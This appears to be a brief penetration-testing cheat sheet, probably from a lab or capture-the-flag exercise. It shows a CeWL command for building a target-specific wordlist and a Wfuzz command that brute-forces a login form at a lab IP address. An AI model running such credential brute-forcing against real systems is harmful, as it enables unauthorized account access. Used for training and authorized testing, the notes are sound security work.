## CeWL
> Generates wordlists
-----
`cewl url -w output.txt`

### Advantages
1. Target-specific words
2. Depth of Search
3. Customisable output
4. Built-in features
5. Efficiency
6. Integration with other tools
7. Actively maintained

### Usernames from /team.php

## Wfuzz
`wfuzz -c -z file,usernames.txt -z file,password.txt --hs "Please enter the correct credentials" -u http://10.10.10.59/login.php -d "username=FUZZ&password=FUZ2Z"`
